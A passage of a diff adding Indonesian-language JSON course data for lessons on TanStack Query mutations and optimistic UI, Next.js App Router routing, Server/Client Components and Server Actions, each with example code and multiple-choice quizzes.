+              "staleTime menentukan durasi data dianggap masih segar (fresh) sehingga tidak memicu request ulang ke server, sedangkan gcTime menentukan berapa lama data tidak aktif disimpan di memori cache sebelum dihapus.",
+              "staleTime hanya untuk file CSS sedangkan gcTime untuk HTML.",
+              "gcTime menentukan kecepatan loading internet.",
+              "Keduanya adalah sinonim yang persis sama."
+            ],
+            "correctIndex": 0,
+            "explanation": "staleTime mengontrol kesegaran data untuk refetching, sedangkan gcTime (Garbage Collection) mengontrol retensi data tidak aktif di memori RAM."
+          },
+          {
+            "id": "q-15-4-3",
+            "question": "Fitur bawaan otomatis apakah yang disediakan oleh TanStack Query tanpa perlu konfigurasi kode tambahan?",
+            "options": [
+              "Automatic background refetching saat pengguna kembali fokus ke tab browser (Window Focus Refetching) dan deduplikasi request simultan.",
+              "Pembuatan server database MySQL otomatis.",
+              "Penerjemahan bahasa aplikasi otomatis.",
+              "Penghapusan file JavaScript yang tidak terpakai."
+            ],
+            "correctIndex": 0,
+            "explanation": "TanStack Query secara cerdas melakukan auto-refetch saat window kembali fokus, koneksi online pulih, atau komponen me-mount ulang data basi."
+          }
+        ]
+      },
+      {
+        "id": "lesson-15-5",
+        "stageId": "stage-15",
+        "slug": "mutations-query-invalidation-dan-optimistic-ui",
+        "title": "Mutations, Query Invalidation & Optimistic UI",
+        "titleEn": "Mutations & Optimistic UI Updates",
+        "level": "ADVANCED",
+        "estimatedMinutes": 20,
+        "description": "Mengirim perubahan data ke server dengan useMutation (POST, PUT, DELETE), memperbarui cache otomatis dengan queryClient.invalidateQueries, dan teknik Optimistic Updates.",
+        "prerequisites": [
+          "tanstack-query-fetching-dan-caching"
+        ],
+        "learningObjectives": [
+          "Menerapkan hook useMutation untuk operasi mutasi data (Create, Update, Delete).",
+          "Menerapkan Query Invalidation (`queryClient.invalidateQueries({ queryKey })`) untuk memicu refetch data segar setelah mutasi sukses.",
+          "Menerapkan Optimistic Updates: memperbarui tampilan UI di layar seketika sebelum respon server selesai dan melakukan rollback jika terjadi kegagalan jaringan."
+        ],
+        "whyMatters": "Optimistic UI memberikan ilusi aplikasi yang memiliki kecepatan 0 millisecond (seperti tombol Like di Instagram yang seketika berubah merah tanpa menunggu sinyal server).",
+        "careerContext": "Penerapan Optimistic Updates dan Cache Invalidation adalah kemampuan tingkat lanjut wajib bagi Senior Web Developer.",
+        "commonMistakes": [
+          "Lupa meng-invalidate query setelah mutasi sukses, sehingga tampilan daftar data tetap menampilkan data lama.",
+          "Tidak menyediakan mekanisme rollback pada Optimistic Updates saat koneksi server gagal/error."
+        ],
+        "keyTerms": [
+          {
+            "term": "useMutation",
+            "definition": "Hook TanStack Query untuk melakukan operasi mutasi data (POST/PUT/DELETE) yang memiliki efek samping di server."
+          },
+          {
+            "term": "Query Invalidation",
+            "definition": "Proses menandai cache query tertentu sebagai basi (stale) dan memicu refetching otomatis untuk mendapatkan data terbaru."
+          },
+          {
+            "term": "Optimistic UI",
+            "definition": "Teknik memperbarui antarmuka pengguna secara langsung dengan asumsi bahwa request ke server pasti akan berhasil."
+          }
+        ],
+        "contentMd": "# Mutations, Query Invalidation & Optimistic UI\n\n## Apa yang Akan Dipelajari?\nPada materi tingkat lanjut ini, Anda akan mempelajari cara melakukan operasi pengubahan data (**Mutations**) dengan **`useMutation`**, menyinkronkan data segar menggunakan **`queryClient.invalidateQueries`**, serta mengimplementasikan teknik antarmuka kelas dunia: **Optimistic UI Updates**.\n\n## Mengapa Konsep Ini Penting?\nSetelah pengguna menambahkan komentar baru di kursus, bagaimana cara memastikan daftar komentar otomatis terbarui dengan komentar baru tersebut? Dan bagaimana cara membuat tombol \"Selesai Baca\" merespon seketika dalam 0 milidetik tanpa menunggu jeda sinyal server?\n\n## 1. Operasi Mutasi dengan `useMutation` & Invalidation\n\n```tsx\nimport { useMutation, useQueryClient } from \"@tanstack/react-query\";\n\nasync function tambahTugasBaru(teksTugas: string) {\n  const res = await fetch(\"/api/todos\", {\n    method: \"POST\",\n    headers: { \"Content-Type\": \"application/json\" },\n    body: JSON.stringify({ title: teksTugas })\n  });\n  if (!res.ok) throw new Error(\"Gagal menambah tugas\");\n  return res.json();\n}\n\nexport function FormTambahTugas() {\n  const queryClient = useQueryClient();\n\n  const mutasi = useMutation({\n    mutationFn: tambahTugasBaru,\n    // Saat mutasi SUKSES, beritahu TanStack Query bahwa cache ['todos'] sudah BASI:\n    onSuccess: () => {\n      // INVENTARISIR ULANG DATA SEGAR DARI SERVER:\n      queryClient.invalidateQueries({ queryKey: [\"todos\"] });\n    },\n    onError: (err) => {\n      alert(\"Gagal menambahkan tugas: \" + err.message);\n    }\n  });\n\n  return (\n    <button \n      disabled={mutasi.isPending}\n      onClick={() => mutasi.mutate(\"Belajar TanStack Query\")}\n    >\n      {mutasi.isPending ? \"Menyimpan...\" : \"Tambah Tugas\"}\n    </button>\n  );\n}\n```\n\n## 2. Tingkat Mahir: Optimistic UI Updates (Respon 0 Millisecond)\nUbah tampilan di layar **SEKETIKA**, lalu batalkan (*rollback*) jika server ternyata gagal:\n\n```tsx\nconst mutasiLike = useMutation({\n  mutationFn: toggleLikePost,\n\n  // 1. Dijalankan SEBELUM request jaringan ditembakkan:\n  onMutate: async (postId) => {\n    // Batalkan query yang sedang berjalan agar tidak menimpa optimasi kita:\n    await queryClient.cancelQueries({ queryKey: [\"post\", postId] });\n\n    // Ambil snapshot data lama untuk jaga-jaga rollback:\n    const previousPost = queryClient.getQueryData([\"post\", postId]);\n\n    // Update Cache Secara Optimis Langsung di Memori:\n    queryClient.setQueryData([\"post\", postId], (old: any) => ({\n      ...old,\n      isLiked: !old.isLiked,\n      likeCount: old.isLiked ? old.likeCount - 1 : old.likeCount + 1,\n    }));\n\n    // Kembalikan konteks rollback\n    return { previousPost };\n  },\n\n  // 2. Jika terjadi ERROR jaringan, kembalikan ke data lama (Rollback):\n  onError: (err, postId, context) => {\n    if (context?.previousPost) {\n      queryClient.setQueryData([\"post\", postId], context.previousPost);\n    }\n    alert(\"Gagal memberikan like. Koneksi terputus.\");\n  },\n\n  // 3. Selalu sinkronkan ulang data final di akhir:\n  onSettled: (data, error, postId) => {\n    queryClient.invalidateQueries({ queryKey: [\"post\", postId] });\n  },\n});\n```\n\n## Kesalahan Umum Pemula\n- **Lupa invalidate query**: Setelah melakukan POST data baru, daftar di layar tidak bertambah karena cache query lama masih dianggap valid. Selalu panggil `queryClient.invalidateQueries`.\n\n## Praktik Mandiri\n1. Buat mutasi `hapusKursus` yang memanggil `queryClient.invalidateQueries({ queryKey: ['courses'] })` pada `onSuccess`.\n\n## Ringkasan\n- Gunakan **`useMutation`** untuk operasi pengubahan data (POST, PUT, DELETE).\n- Gunakan **`queryClient.invalidateQueries`** untuk memicu refetching otomatis data terbaru setelah mutasi.\n- **Optimistic UI** memperbarui antarmuka secara instan di depan (0ms delay) dengan proteksi **Rollback** otomatis saat terjadi kegagalan jaringan.",
+        "quizzes": [
+          {
+            "id": "q-15-5-1",
+            "question": "Apa fungsi dari perintah queryClient.invalidateQueries({ queryKey: ['todos'] }) di dalam callback onSuccess pada useMutation?",
+            "options": [
+              "Menandai cache query ['todos'] sebagai data basi (stale) dan memicu penarikan ulang data segar (refetch) secara otomatis dari server backend.",
+              "Menghapus seluruh database server.",
+              "Mematikan fungsi mutasi secara permanen.",
+              "Mengubah tipe data menjadi string."
+            ],
+            "correctIndex": 0,
+            "explanation": "Invalidate queries memberi tahu TanStack Query bahwa data cache terkait sudah usang akibat mutasi dan harus segera di-refetch."
+          },
+          {
+            "id": "q-15-5-2",
+            "question": "Apa filosofi utama dari teknik 'Optimistic UI Updates' dalam pembangunan antarmuka aplikasi modern?",
+            "options": [
+              "Memperbarui tampilan antarmuka visual di layar pengguna secara instan sebelum respon server selesai, dengan asumsi bahwa permintaan akan berhasil, serta menyediakan mekanisme rollback jika server gagal.",
+              "Selalu menampilkan loading spinner selama minimal 10 detik.",
+              "Menolak permintaan pengguna yang tidak optimis.",
+              "Hanya memperbarui UI saat koneksi internet berkecepatan 5G."
+            ],
+            "correctIndex": 0,
+            "explanation": "Optimistic UI memberikan responsivitas antarmuka instan (zero-perceived-latency) yang meningkatkan kepuasan pengguna secara dramatis."
+          },
+          {
+            "id": "q-15-5-3",
+            "question": "Hook TanStack Query manakah yang secara khusus digunakan untuk operasi mutasi pengubahan data di server (seperti POST, PUT, PATCH, DELETE)?",
+            "options": [
+              "useMutation",
+              "useQuery",
+              "useFetch",
+              "useServerAction"
+            ],
+            "correctIndex": 0,
+            "explanation": "useMutation dirancang untuk operasi mutasi yang mengubah data (CUD) dan memiliki side effect pada server backend."
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "id": "stage-16",
+    "orderIndex": 16,
+    "titleId": "Next.js 16 App Router & Fullstack Architecture",
+    "titleEn": "Next.js 16 App Router & Fullstack Architecture",
+    "category": "Fullstack & DevOps",
+    "description": "Menguasai framework fullstack Next.js 16: App Router file-system routing, Server Components vs Client Components ('use client'), Server Actions (mutasi database), Layouts & Templates, Metadata API untuk SEO, dan Turbopack bundler.",
+    "descriptionEn": "Master Next.js 16 fullstack framework: App Router, RSC vs Client Components, Server Actions, Layouts, Metadata SEO, and Turbopack.",
+    "lessons": [
+      {
+        "id": "lesson-16-1",
+        "stageId": "stage-16",
+        "slug": "app-router-file-system-routing",
+        "title": "App Router & File-System Based Routing",
+        "titleEn": "App Router & File-System Based Routing",
+        "level": "INTERMEDIATE",
+        "estimatedMinutes": 20,
+        "description": "Memahami struktur folder Next.js App Router (app/ folder), konvensi file khusus (page.tsx, layout.tsx, loading.tsx, not-found.tsx, error.tsx), Route Groups (folder), dan Dynamic Routes [slug].",
+        "prerequisites": [
+          "mutations-query-invalidation-dan-optimistic-ui"
+        ],
+        "learningObjectives": [
+          "Menjelaskan sistem perutean berbasis struktur folder (File-System Routing) pada Next.js App Router.",
+          "Membedakan fungsi konvensi file khusus: page.tsx, layout.tsx, loading.tsx, error.tsx, dan not-found.tsx.",
+          "Menerapkan Dynamic Routes `[slug]` dan Catch-all Routes `[...slug]` untuk halaman dinamis.",
+          "Mengorganisasi struktur folder tanpa memengaruhi URL menggunakan Route Groups `(marketing)` atau `(dashboard)`."
+        ],
+        "whyMatters": "Next.js App Router adalah standar industri nomor satu untuk membangun aplikasi React fullstack dengan performa tinggi dan SEO bawaan.",
+        "careerContext": "Seluruh proyek web production modern dibangun di atas ekosistem Next.js App Router.",
+        "commonMistakes": [
+          "Lupa bahwa di App Router, file yang menjadi halaman publik WAJIB bernama persis `page.tsx` di dalam folder target.",
+          "Mengira folder bertanda kurung `(group)` akan muncul di URL (Route Groups tidak memengaruhi segmen URL browser)."
+        ],
+        "keyTerms": [
+          {
+            "term": "App Router",
+            "definition": "Arsitektur perutean modern Next.js berbasis folder `app/` yang dibangun di atas React Server Components."
+          },
+          {
+            "term": "page.tsx",
+            "definition": "File khusus yang mendefinisikan tampilan UI publik unik untuk suatu segmen rute URL."
+          },
+          {
+            "term": "Dynamic Routes ([slug])",
+            "definition": "Segmen rute berparameter dinamis (seperti `app/blog/[slug]/page.tsx`)."
+          },
+          {
+            "term": "Route Groups ((group))",
+            "definition": "Konvensi folder bertanda kurung untuk mengelompokkan rute tanpa menambahkan segmen ke URL."
+          }
+        ],
+        "contentMd": "# App Router & File-System Based Routing\n\n## Apa yang Akan Dipelajari?\nPada materi ini, Anda akan mempelajari arsitektur **Next.js 16 App Router**: bagaimana sistem perutean berbasis struktur folder (**File-System Routing**) bekerja, konvensi file khusus (**`page.tsx`**, **`layout.tsx`**, **`loading.tsx`**, **`error.tsx`**), pembuatan **Dynamic Routes (`[slug]`)**, serta pengelompokan dengan **Route Groups `(...)`**.\n\n## Mengapa Konsep Ini Penting?\nDi React tradisional, Anda harus menginstal `react-router-dom` dan menulis puluhan baris konfigurasi `<Route path=\"...\" />` secara manual. Di Next.js, membuat folder baru otomatis menciptakan URL rute baru di browser!\n\n## 1. Peta Konvensi File Khusus Next.js App Router\n\n| Nama File Khusus | Peran & Fungsi |\n| :--- | :--- |\n| **`page.tsx`** | **Tampilan Halaman Unik** yang dapat diakses publik di URL tersebut. |\n| **`layout.tsx`** | **Kerangka Pembungkus Bersama** (Navbar, Sidebar) yang persisten antar navigasi halaman. |\n| **`loading.tsx`** | **Indikator Loading Instan** berbasis React Suspense yang otomatis tampil saat halaman dimuat. |\n| **`error.tsx`** | **Error Boundary** yang menangani error runtime di segmen rute tersebut (Wajib `'use client'`). |\n| **`not-found.tsx`** | **Tampilan Khusus 404** saat rute tidak ditemukan. |\n\n## 2. Pemetaan URL Berdasarkan Folder\n\n```text\napp/\n├── page.tsx                     ──> https://domain.com/\n├── about/\n│   └── page.tsx                 ──> https://domain.com/about\n├── blog/\n│   ├── page.tsx                 ──> https://domain.com/blog\n│   └── [slug]/\n│       └── page.tsx             ──> https://domain.com/blog/belajar-nextjs-16 (Dynamic Route!)\n└── (dashboard)/                 ──> Route Group (Nama folder DIABAIKAN dari URL)\n    └── settings/\n        └── page.tsx             ──> https://domain.com/settings\n```\n\n## 3. Menangani Dynamic Route Parameters (`[slug]`)\nDi Next.js 16 (Async Props):\n\n```tsx\n// File: app/courses/[slug]/page.tsx\ninterface PageProps {\n  params: Promise<{ slug: string }>;\n}\n\nexport default async function CourseDetailPage({ params }: PageProps) {\n  // Await params untuk membaca nilai dinamis dari URL:\n  const { slug } = await params;\n\n  return (\n    <main className=\"p-8\">\n      <h1 className=\"text-3xl font-bold\">Materi Kursus: {slug}</h1>\n      <p>Sedang membaca rute dinamis untuk kursus: {slug}</p>\n    </main>\n  );\n}\n```\n\n## 4. Route Groups untuk Mengelompokkan Layout Terpisah\nGunakan folder bertanda kurung `(folder)` saat Anda ingin memisahkan layout:\n- **`app/(marketing)/layout.tsx`**: Memiliki Header & Footer umum untuk Landing Page.\n- **`app/(admin)/layout.tsx`**: Memiliki Sidebar khusus untuk Dashboard Admin tanpa Header umum.\n\n## Kesalahan Umum Pemula\n- **Menamai file selain `page.tsx`**: Membuat file `app/about/About.tsx` tidak akan menghasilkan URL rute. File rute publik WAJIB bernama persis `page.tsx`.\n\n## Praktik Mandiri\n1. Buat struktur folder `app/products/[id]/page.tsx`.\n2. Ekstrak parameter `id` dari `params` dan tampilkan di layar.\n\n## Ringkasan\n- Next.js App Router menggunakan **File-System Routing** berbasis folder di dalam `app/`.\n- **`page.tsx`** mendefinisikan tampilan unik halaman.\n- **`[slug]`** mendefinisikan rute berparameter dinamis.\n- **`(group)`** mengelompokkan rute dan layout tanpa memengaruhi segmen URL browser.",
+        "quizzes": [
+          {
+            "id": "q-16-1-1",
+            "question": "Di dalam arsitektur Next.js App Router, nama file apakah yang WAJIB digunakan di dalam suatu folder agar segmen folder tersebut menjadi rute halaman web publik yang dapat diakses di browser?",
+            "options": [
+              "page.tsx (atau page.jsx/page.js)",
+              "index.html",
+              "route.tsx",
+              "view.tsx"
+            ],
+            "correctIndex": 0,
+            "explanation": "page.tsx adalah konvensi file khusus yang mendefinisikan tampilan UI publik unik untuk rute folder terkait di App Router."
+          },
+          {
+            "id": "q-16-1-2",
+            "question": "Bagaimana cara mendefinisikan rute dinamis (Dynamic Routes) untuk menangani URL seperti /courses/react-dasar atau /courses/nextjs di Next.js App Router?",
+            "options": [
+              "Membuat folder dengan nama di dalam kurung siku: app/courses/[slug]/page.tsx",
+              "Membuat file bernama app/courses/dynamic.tsx",
+              "Menuliskan konfigurasi di file next.config.js",
+              "Membuat folder dengan tanda bintang: app/courses/*/page.tsx"
+            ],
+            "correctIndex": 0,
+            "explanation": "Kurung siku [parameter] adalah konvensi resmi Next.js untuk mendefinisikan segmen rute dinamis berparameter."
+          },
+          {
+            "id": "q-16-1-3",
+            "question": "Apa fungsi dari folder Route Group yang menggunakan tanda kurung (contoh: app/(marketing)/about/page.tsx)?",
+            "options": [
+              "Mengelompokkan rute dan layout secara terorganisir tanpa menambahkan nama folder tersebut ke dalam segmen URL browser (URL tetap /about).",
+              "Mengharuskan pengguna login sebelum mengakses halaman.",
+              "Mengompresi file rute menjadi arsip ZIP.",
+              "Menghapus rute dari mesin pencari Google."
+            ],
+            "correctIndex": 0,
+            "explanation": "Route Groups (folderName) memungkinkan organisasi folder dan pemisahan layout tanpa memengaruhi struktur URL publik."
+          }
+        ]
+      },
+      {
+        "id": "lesson-16-2",
+        "stageId": "stage-16",
+        "slug": "server-components-vs-client-components",
+        "title": "Server Components vs Client Components ('use client')",
+        "titleEn": "Server Components vs Client Components",
+        "level": "INTERMEDIATE",
+        "estimatedMinutes": 20,
+        "description": "Membedah paradigma React Server Components (RSC): komponen default berjalan di server (zero-bundle size, akses langsung database) vs Client Components dengan direktif 'use client' (interaktivitas, onClick, hooks).",
+        "prerequisites": [
+          "app-router-file-system-routing"
+        ],
+        "learningObjectives": [
+          "Menjelaskan bahwa secara default seluruh komponen di Next.js App Router adalah React Server Components (RSC).",
+          "Menganalisis keuntungan Server Components: zero client-side JavaScript bundle, akses aman langsung ke database/API keys, dan SEO instan.",
+          "Menerapkan direktif 'use client' HANYA pada daun pohon komponen (leaf components) yang membutuhkan interaktivitas (useState, useEffect, event onClick).",
+          "Menerapkan pola passing Server Components sebagai children ke dalam Client Components."
+        ],
+        "whyMatters": "Memahami batas (Boundary) Server vs Client Components adalah kunci menghasilkan website Next.js dengan skor Google Lighthouse 100.",
+        "careerContext": "Keahlian arsitektur React Server Components adalah tolok ukur utama kompetensi Next.js level menengah ke atas.",
+        "commonMistakes": [
+          "Menuliskan `'use client'` di bagian paling atas layout/halaman root (yang mematikan seluruh manfaat Server Components di aplikasi Anda).",
+          "Mencoba menggunakan hooks (`useState`, `useEffect`) di dalam Server Component tanpa deklarasi `'use client'`."
+        ],
+        "keyTerms": [
+          {
+            "term": "React Server Components (RSC)",
+            "definition": "Komponen React yang dieksekusi HANYA di lingkungan server dan mengirimkan HTML statis tanpa JavaScript ke browser."
+          },
+          {
+            "term": "Client Components",
+            "definition": "Komponen React interaktif tradisional yang di-hydrate dan dieksekusi di browser client (ditandai dengan `'use client'`)."
+          },
+          {
+            "term": "Zero Bundle Size",
+            "definition": "Keuntungan di mana library server-side besar (seperti markdown parser) tidak ikut diunduh ke browser pengguna."
+          }
+        ],
+        "contentMd": "# Server Components vs Client Components ('use client')\n\n## Apa yang Akan Dipelajari?\nPada materi ini, Anda akan mempelajari konsep paling revolusioner di Next.js 16: **React Server Components (RSC)** vs **Client Components**, kapan wajib menggunakan direktif **`'use client'`**, serta arsitektur **Composition Pattern** untuk performa kilat.\n\n## Mengapa Konsep Ini Penting?\nDi React lama, seluruh kode JavaScript harus diunduh oleh browser pengguna sebelum halaman bisa tampil. Di Next.js App Router, **seluruh komponen secara bawaan (default) berjalan di SERVER**. Kode komputasi berat dan query database diproses di server, dan hanya HTML ringan yang dikirim ke browser!\n\n## 1. Perbandingan Karakteristik Server vs Client Components\n\n| Kriteria | Server Components (Default) | Client Components (`'use client'`) |\n| :--- | :--- | :--- |\n| **Lokasi Eksekusi** | **Hanya di Server** | Server (Prerender) + **Browser Client** |\n| **Dampak ke JS Bundle** | **0 KB (Zero-Bundle Size!)** | Menambah ukuran file JS yang diunduh user |\n| **Akses Database / Secrets** | **BISA Langsung** (`db.query()`, `process.env`) | DILARANG (Kredensial bisa bocor ke publik) |\n| **Bisa Menggunakan Hooks?** | **TIDAK BISA** (No `useState`, `useEffect`) | **BISA** (`useState`, `useEffect`, dll) |\n| **Interaksi Event Browser** | TIDAK BISA (No `onClick`, `onChange`) | **BISA** (`onClick`, event listener) |\n\n## 2. Kapan Harus Menggunakan `'use client'`?\nGunakan direktif `'use client'` **HANYA** jika komponen Anda:\n1. Membutuhkan interaktivitas event: `onClick`, `onSubmit`, `onChange`.\n2. Membutuhkan State atau Lifecycle Hooks: `useState`, `useEffect`, `useRef`.\n3. Membutuhkan Browser API: `window`, `localStorage`, `navigator`.\n\n```tsx\n// File: src/components/TombolLike.tsx\n\"use client\"; // KUNCI: Menandai batas Client Component!\n\nimport { useState } from \"react\";\n\nexport function TombolLike() {\n  const [likes, setLikes] = useState(0);\n\n  return (\n    <button onClick={() => setLikes(l => l + 1)} className=\"btn\">\n      ❤️ {likes} Likes\n    </button>\n  );\n}\n```\n\n## 3. Pola Arsitektur Ideal: Dorong `'use client'` ke Ujung Ranting (*Leaf Components*)\nPertahankan halaman utama sebagai **Server Component**, dan bungkus hanya elemen tombol interaktif kecil sebagai **Client Component**:\n\n```tsx\n// File: app/courses/page.tsx (SERVER COMPONENT - DEFAULT)\nimport { db } from \"@/lib/db\";\nimport { TombolLike } from \"@/components/TombolLike\"; // Client Component kecil\n\nexport default async function CoursesPage() {\n  // Query database langsung dengan aman di server!\n  const courses = await db.course.findMany();\n\n  return (\n    <main className=\"p-6\">\n      <h1 className=\"text-2xl font-bold\">Daftar Kursus</h1>\n      {courses.map(course => (\n        <div key={course.id} className=\"p-4 border rounded my-2\">\n          <h2>{course.title}</h2>\n          <p>{course.description}</p>\n          \n          {/* HANYA TOMBOL INTERAKTIF INI YANG MERUPAKAN CLIENT COMPONENT: */}\n          <TombolLike />\n        </div>\n      ))}\n    </main>\n  );\n}\n```\n\n## Kesalahan Umum Pemula\n- **Menaruh 'use client' di root layout**: Ini membuat seluruh aplikasi kembali menjadi client-side app yang lambat dan membuang keunggulan Server Components.\n\n## Praktik Mandiri\n1. Buat halaman Server Component yang melakukan fetch data dengan `await fetch()`.\n2. Sisipkan komponen Client Component saklar dark-mode di dalamnya.\n\n## Ringkasan\n- Secara default, seluruh komponen di App Router adalah **Server Components**.\n- Server Components menghemat ukuran JavaScript browser hingga **0 KB** dan aman membaca database.\n- Gunakan **`'use client'`** hanya pada komponen daun terkecil yang membutuhkan interaktivitas (*onClick, useState*).",
+        "quizzes": [
+          {
+            "id": "q-16-2-1",
+            "question": "Secara default, apakah jenis komponen dari seluruh file page.tsx dan layout.tsx di dalam Next.js App Router jika tidak diberi direktif khusus?",
+            "options": [
+              "React Server Components (RSC) yang dieksekusi secara murni di lingkungan server.",
+              "Client Components yang dieksekusi di browser.",
+              "File HTML statis murni tanpa logika.",
+              "Database schema."
+            ],
+            "correctIndex": 0,
+            "explanation": "Di Next.js App Router, semua komponen secara bawaan adalah Server Components kecuali jika secara eksplisit ditandai dengan 'use client'."
+          },
+          {
+            "id": "q-16-2-2",
+            "question": "Kapan seorang developer WAJIB menambahkan direktif 'use client' pada baris paling atas sebuah file komponen di Next.js?",
+            "options": [
+              "Ketika komponen tersebut membutuhkan interaksi browser pengguna (seperti event handler onClick, onChange) atau menggunakan React State/Lifecycle Hooks (useState, useEffect).",
+              "Hanya saat ingin melakukan query database PostgreSQL.",
+              "Setiap kali ingin menampilkan gambar foto.",
+              "Ketika komponen memiliki lebih dari 50 baris kode."
+            ],
+            "correctIndex": 0,
+            "explanation": "Direktif 'use client' mendefinisikan boundary pemisah untuk kode yang membutuhkan API browser, event listeners, atau React hooks."
+          },
+          {
+            "id": "q-16-2-3",
+            "question": "Apa keuntungan performa utama dari React Server Components (RSC) bagi pengguna website di perangkat smartphone dengan koneksi lambat?",
+            "options": [
+              "Zero-Bundle Size: kode library server dan komputasi render diproses di server sehingga pengguna tidak perlu mengunduh file JavaScript yang berat ke browser mereka.",
+              "Baterai ponsel otomatis terisi penuh saat membuka website.",
+              "Komponen Server Components tidak memerlukan koneksi internet.",
+              "Resolusi layar ponsel otomatis meningkat menjadi 4K."
+            ],
+            "correctIndex": 0,
+            "explanation": "Server Components tidak menyertakan JavaScript komponen ke bundle client, secara drastis memangkas waktu First Contentful Paint dan TTI."
+          }
+        ]
+      },
+      {
+        "id": "lesson-16-3",
+        "stageId": "stage-16",
+        "slug": "server-actions-dan-form-mutations",
+        "title": "Server Actions & Mutasi Data ('use server')",
+        "titleEn": "Server Actions & Form Mutations",
+        "level": "INTERMEDIATE",
+        "estimatedMinutes": 20,
+        "description": "Menjalankan fungsi asynchronous di server langsung dari formulir client menggunakan Server Actions ('use server'), revalidatePath, revalidateTag, useActionState, dan useFormStatus.",
+        "prerequisites": [
+          "server-components-vs-client-components"
+        ],
+        "learningObjectives": [
+          "Mendefinisikan Server Actions asinkron menggunakan direktif `'use server'`.",
+          "Menghubungkan Server Actions ke atribut `action={serverAction}` pada tag `<form>`.",
+          "Memicu pembaruan cache halaman secara otomatis menggunakan `revalidatePath()`.",
+          "Mengelola status pending form submission menggunakan hook `useActionState` dan `useFormStatus`."
+        ],
+        "whyMatters": "Server Actions mengeliminasi kebutuhan membuat API Route Handler terpisah (seperti `/api/submit`) hanya untuk menyimpan data formulir ke database.",
+        "careerContext": "Server Actions adalah pola mutasi data standar modern di Next.js 16 fullstack architecture.",
+        "commonMistakes": [
+          "Lupa menambahkan `'use server'` di dalam fungsi aksi server.",
+          "Lupa memanggil `revalidatePath('/courses')` setelah mutasi database selesai (menyebabkan halaman tidak menampilkan data baru)."
+        ],
+        "keyTerms": [
+          {
+            "term": "Server Actions",
+            "definition": "Fungsi asynchronous yang didefinisikan dengan `'use server'` yang dieksekusi secara aman di lingkungan server."
+          },
+          {
+            "term": "revalidatePath()",
+            "definition": "Fungsi Next.js untuk membersihkan cache halaman tertentu dan memicu re-fetch data server secara instan."
+          },
+          {
+            "term": "useActionState",
+            "definition": "Hook React 19 / Next.js untuk mengelola state hasil return dari Server Action beserta status pending-nya."
+          }
+        ],
+        "contentMd": "# Server Actions & Mutasi Data ('use server')\n\n## Apa yang Akan Dipelajari?\nPada materi ini, Anda akan mempelajari fitur mutasi data paling elegan di Next.js 16: **Server Actions (`'use server'`)**, bagaimana mengeksekusi fungsi server langsung dari formulir, membersihkan cache dengan **`revalidatePath()`**, serta mengelola status pending dengan hook **`useActionState`**.\n\n## Mengapa Konsep Ini Penting?\nDahulu, untuk menyimpan formulir pendaftaran, Anda harus:\n1. Membuat file endpoint API terpisah `app/api/register/route.ts`.\n2. Menulis `fetch('/api/register', { method: 'POST' })` di frontend.\n3. Mengelola status error dan refetching secara manual.\nDengan Server Actions, Anda dapat memanggil fungsi database server **langsung dari atribut `<form action={...}>`** secara aman!\n\n## 1. Membuat Server Action Pertama (`'use server'`)\n\n```typescript\n// File: app/actions/courseActions.ts\n\"use server\"; // KUNCI: Menandai seluruh fungsi di file ini dieksekusi di SERVER\n\nimport { db } from \"@/lib/db\";\nimport { revalidatePath } from \"next/cache\";\n\nexport async function createCourseAction(formData: FormData) {\n  // Ekstrak data formulir langsung di server:\n  const title = formData.get(\"title\") as string;\n  const description = formData.get(\"description\") as string;\n\n  // 1. Simpan langsung ke Database PostgreSQL dengan aman:\n  await db.course.create({\n    data: { title, description }\n  });\n\n  // 2. BERSIHKAN CACHE HALAMAN agar materi baru langsung muncul di layar:\n  revalidatePath(\"/courses\");\n}\n```\n\n## 2. Menghubungkan ke Tag `<form>` di Server Component\n\n```tsx\n// File: app/courses/tambah/page.tsx (Server Component)\nimport { createCourseAction } from \"@/app/actions/courseActions\";\n\nexport default function TambahCoursePage() {\n  return (\n    <form action={createCourseAction} className=\"max-w-md p-6 space-y-4\">\n      <input name=\"title\" placeholder=\"Judul Kursus\" required className=\"border p-2 w-full\" />\n      <textarea name=\"description\" placeholder=\"Deskripsi\" className=\"border p-2 w-full\" />\n      <button type=\"submit\" className=\"bg-blue-600 text-white px-4 py-2 rounded\">\n        Simpan Kursus\n      </button>\n    </form>\n  );\n}\n```\n\n## 3. Menangani State Feedback dengan `useActionState` (React 19 / Next.js 16)\nJika Anda ingin menampilkan pesan error atau status loading spinner:\n\n```tsx\n\"use client\";\n\nimport { useActionState } from \"react\";\nimport { registerUserAction } from \"@/app/actions/authActions\";\n\nexport function FormRegistrasi() {\n  // [stateHasil, formActionTrigger, isPending]\n  const [state, formAction, isPending] = useActionState(registerUserAction, null);\n\n  return (\n    <form action={formAction}>\n      <input name=\"email\" type=\"email\" required />\n      {state?.error && <p className=\"text-red-500\">{state.error}</p>}\n      \n      <button disabled={isPending} type=\"submit\">\n        {isPending ? \"Mendaftarkan...\" : \"Daftar Akun\"}\n      </button>\n    </form>\n  );\n}\n```\n\n## Kesalahan Umum Pemula\n- **Lupa revalidatePath()**: Data berhasil tersimpan di database, tetapi halaman browser tidak menampilkan perubahan karena Next.js masih menyajikan cache lama. Selalu panggil `revalidatePath()`.\n\n## Praktik Mandiri\n1. Buat Server Action `hapusKursusAction(id: string)`.\n2. Panggil dari tombol formulir dengan input hidden `<input type=\"hidden\" name=\"id\" value={course.id} />`.\n\n## Ringkasan\n- **Server Actions (`'use server'`)** mengeksekusi mutasi data langsung di server tanpa butuh API endpoint terpisah.\n- Tautkan langsung ke elemen **`<form action={myAction}>`**.\n- Gunakan **`revalidatePath()`** untuk menyegarkan cache data halaman secara otomatis.\n- Gunakan **`useActionState`** untuk menangani status pending dan validasi error di Client Component.",
+        "quizzes": [
+          {
+            "id": "q-16-3-1",
+            "question": "Apa fungsi utama dari fitur Server Actions (ditandai dengan direktif 'use server') di Next.js?",
+            "options": [
+              "Memungkinkan penulisan fungsi asinkron yang dieksekusi secara aman di server yang dapat dipanggil langsung dari formulir client tanpa perlu membuat file API endpoint route handler terpisah.",
+              "Mengubah koneksi internet pengguna menjadi Wi-Fi publik.",
+              "Menghapus seluruh file gambar di server hosting.",
+              "Membatasi jumlah pengunjung website."
+            ],
+            "correctIndex": 0,
+            "explanation": "Server Actions menjembatani interaksi form/client dengan eksekusi backend secara seamless dan type-safe di balik layar."
+          },
+          {
+            "id": "q-16-3-2",
+            "question": "Mengapa pemanggilan fungsi revalidatePath('/courses') sangat penting dilakukan di akhir sebuah Server Action setelah mutasi database berhasil?",
+            "options": [
